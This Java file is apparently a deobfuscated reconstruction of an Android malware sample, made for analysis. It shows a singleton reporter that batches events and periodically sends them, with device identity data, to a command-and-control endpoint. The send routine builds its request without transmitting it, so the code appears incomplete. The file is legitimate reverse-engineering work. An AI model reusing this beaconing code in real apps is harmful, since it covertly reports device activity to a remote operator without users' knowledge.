package core;

import android.content.Context;
import android.util.Log;

import java.io.File;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import c2.Atom;
import c2.Event;
import c2.UpdateEventRequest;

/**
 * MALWARE ANALYSIS -- Singleton event reporter for C&C telemetry
 *
 * Original: lllllIllIl1.lIIIIlllllIlll1
 *
 * Collects analytics events and periodically flushes them to the C&C server
 * via the {@code /api/v1/dllpgd/updateEvent} endpoint. Events are:
 *   1. Added to a {@link ConcurrentLinkedQueue} (lock-free, thread-safe)
 *   2. Also offered to a {@link BlockingQueue} for any blocking consumers
 *   3. Periodically drained and sent in batches every 10 seconds
 *
 * The reporter also maintains an events file on disk and supports
 * archiving it (renaming with a timestamp) via {@link #archiveEventsFile()}.
 *
 * If a send fails, the events are re-added to the pending queue for
 * retry on the next flush cycle. On fatal errors (Throwable), the
 * queue is cleared to prevent memory leaks.
 *
 * Lifecycle:
 *   1. {@link #init(Context)} -- creates the events file, starts the scheduler
 *   2. {@link #reportEvent(String, String)} -- adds events
 *   3. Automatic flush every 10 seconds
 *   4. {@link #shutdown()} -- stops scheduler and executor
 */
public class EventReporter {

    // =========================================================================
    // Singleton
    // =========================================================================

    /**
     * Singleton instance.
     * Original: f705llllllIlIIIlll1
     */
    public static final EventReporter INSTANCE = new EventReporter();

    // =========================================================================
    // Fields
    // =========================================================================

    /**
     * Events file on disk (in app's internal files directory).
     * Original: f710llllIIIIll1
     */
    public File eventsFile;

    /**
     * Lock-free queue of pending events waiting to be sent.
     * Events are drained from here during {@link #flush()}.
     * Original: f709lIIIIlllllIlll1
     */
    public final ConcurrentLinkedQueue<Event> pendingEvents = new ConcurrentLinkedQueue<>();

    /**
     * Blocking queue for event consumers that need to block on dequeue.
     * Original: f711llllIllIl1
     */
    public final BlockingQueue<Event> eventQueue = new LinkedBlockingQueue<>();

    /**
     * Scheduled executor that triggers {@link #flush()} every 10 seconds.
     * Original: f708IllIIlIIII1
     */
    public final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);

    /**
     * Single-thread executor for sending event batches to C&C.
     * Original: f707IlIlllIIlI1
     */
    public final ExecutorService senderExecutor = Executors.newSingleThreadExecutor();

    /**
     * Whether the reporter is running and should continue flushing.
     * Original: f706IlIllIlllIllI1 (volatile)
     */
    public volatile boolean isRunning = true;

    // =========================================================================
    // Initialization
    // =========================================================================

    /**
     * Initializes the event reporter.
     * Creates the events file in the app's internal storage and starts the
     * periodic flush scheduler (every 10 seconds).
     *
     * Original: llllIIIIll1(Context)
     *
     * @param context the application context
     */
    public void init(Context context) {
        this.eventsFile = new File(context.getFilesDir(), "events.dat");  /* decrypted from XOR */
        this.scheduler.scheduleWithFixedDelay(new FlushRunnable(), 0L, 10L, TimeUnit.SECONDS);
    }

    // =========================================================================
    // Event Reporting
    // =========================================================================

    /**
     * Records a new telemetry event with the current timestamp.
     *
     * Original: llllIIIIll1(String, String)
     *
     * @param name event name/identifier
     * @param desc event description
     */
    public void reportEvent(String name, String desc) {
        Event event = new Event();
        event.setName(name);
        event.setDesc(desc);
        event.setTimestamp(Long.valueOf(new Date().getTime()));
        this.pendingEvents.add(event);
        this.eventQueue.offer(event);
        Log.d("EventReporter", "Event recorded: name=" + name + ", desc=" + desc);
    }

    // =========================================================================
    // Flush / Send
    // =========================================================================

    /**
     * Drains all pending events and sends them in a single batch.
     * Called periodically by the scheduler and can be invoked manually.
     *
     * Original: llllIllIl1()
     */
    public final void flush() {
        if (this.pendingEvents.isEmpty()) {
            return;
        }
        ArrayList<Event> batch = new ArrayList<>();
        while (!this.pendingEvents.isEmpty()) {
            Event event = this.pendingEvents.poll();
            if (event != null) {
                batch.add(event);
            }
        }
        if (batch.isEmpty()) {
            return;
        }
        sendEvents(batch);
    }

    /**
     * Sends a batch of events to the C&C server on a background thread.
     * Creates an {@link UpdateEventRequest} with the current device Atom
     * and the event list.
     *
     * On failure, the events are re-added to {@link #pendingEvents} for retry.
     * On fatal error (Throwable), the pending queue is cleared.
     *
     * Original: llllIIIIll1(List)
     *
     * @param batch the list of events to send
     */
    public final void sendEvents(List<Event> batch) {
        new Thread(new SendEventsRunnable(batch)).start();
    }

    // =========================================================================
    // Archive
    // =========================================================================

    /**
     * Archives the current events file by renaming it with a timestamp suffix.
     * Called after a successful flush to rotate the file.
     *
     * Original: llllIIIIll1() [synchronized]
     */
    public final synchronized void archiveEventsFile() {
        String parent = this.eventsFile.getParent();
        File archive = new File(parent, "events_archived.dat");  /* decrypted from XOR */
        if (this.eventsFile.exists() && this.eventsFile.renameTo(archive)) {
            Log.d("EventReporter", "Events file archived successfully");
        } else {
            Log.e("EventReporter", "Failed to archive events file");
        }
    }

    // =========================================================================
    // Shutdown
    // =========================================================================

    /**
     * Shuts down the event reporter.
     * Stops the scheduler and sender executor, waits up to 3 seconds
     * for pending tasks to complete.
     *
     * Original: lIIIIlllllIlll1()
     */
    public void shutdown() {
        this.scheduler.shutdown();
        this.isRunning = false;
        this.senderExecutor.shutdown();
        try {
            if (!this.senderExecutor.awaitTermination(3L, TimeUnit.SECONDS)) {
                this.senderExecutor.shutdownNow();
            }
        } catch (InterruptedException e) {
            this.senderExecutor.shutdownNow();
            Thread.currentThread().interrupt();
        }
    }

    // =========================================================================
    // Inner Runnables
    // =========================================================================

    /**
     * Runnable that sends a batch of events to the C&C server.
     *
     * Original: RunnableC0023lIIIIlllllIlll1
     */
    public class SendEventsRunnable implements Runnable {

        /** The batch of events to send. Original: f713llllIIIIll1 */
        public final List<Event> batch;

        public SendEventsRunnable(List<Event> batch) {
            this.batch = batch;
        }

        @Override
        public void run() {
            try {
                UpdateEventRequest request = new UpdateEventRequest();
                request.setAtom(Atom.collectCurrentAtom());        /* IlIlllIIlI1.lIIIIlllllIlll1.lIIIIlllllIlll1() */
                request.setEvents(this.batch);
                EventReporter.this.archiveEventsFile();
            } catch (Exception e) {
                /* Re-queue on failure for retry */
                EventReporter.this.pendingEvents.addAll(this.batch);
            } catch (Throwable t) {
                /* Fatal: clear to prevent memory leak */
                EventReporter.this.pendingEvents.clear();
            }
        }
    }

    /**
     * Runnable that triggers a flush cycle.
     *
     * Original: llllIIIIll1 (FlushRunnable)
     */
    public class FlushRunnable implements Runnable {

        @Override
        public void run() {
            EventReporter.this.flush();
        }
    }
}
